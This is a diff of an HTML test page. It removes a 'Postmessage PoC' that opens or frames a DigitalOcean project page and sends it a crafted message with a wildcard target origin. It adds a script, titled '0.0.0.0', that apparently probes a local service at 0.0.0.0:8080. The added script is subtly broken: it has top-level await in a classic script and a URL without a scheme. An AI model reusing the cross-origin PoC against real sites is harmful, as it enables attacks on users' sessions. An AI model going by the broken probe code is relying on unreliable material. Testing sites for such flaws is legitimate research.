@@ -3,25 +3,21 @@
 <html>
     <head>
         <meta charset="UTF-8" />
-        <title>Postmessage PoC</title>
-        <script>
-            function pocLink() {
-                let win = window.open('https://cloud.digitalocean.com/projects/5d7ae19f-5746-4733-9606-f290991f2e2e/resources?i=95967b');
-                let msg = "cmapi_cookie_privacyxjma7gue0-";
-                
-                setTimeout(function(){
-                    win.postMessage(msg, '*');
-                }, 5000);
-            }
-            function pocFrame(win) {           
-                let msg = "cmapi_cookie_privacyxjma7gue0-";
-                
-                win.postMessage(msg, '*');          
-            }
-        </script>
+        <title>0.0.0.0</title>
     </head>
     <body>
-        <a href="#" onclick="pocLink();">PoC link</a>          
-        <iframe src="https://cloud.digitalocean.com/projects/5d7ae19f-5746-4733-9606-f290991f2e2e/resources?i=95967b" onload="pocFrame(this.contentWindow)"></iframe>                    
+                <script>const url = "0.0.0.0:8080";
+                          try {
+                            const response = await fetch(url);
+                            if (!response.ok) {
+                              throw new Error(`Response status: ${response.status}`);
+                            }
+                        
+                            const json = await response.json();
+                            console.log(json);
+                          } catch (error) {
+                            console.error(error.message);
+                          }
+                </script>
     </body>
 </html>
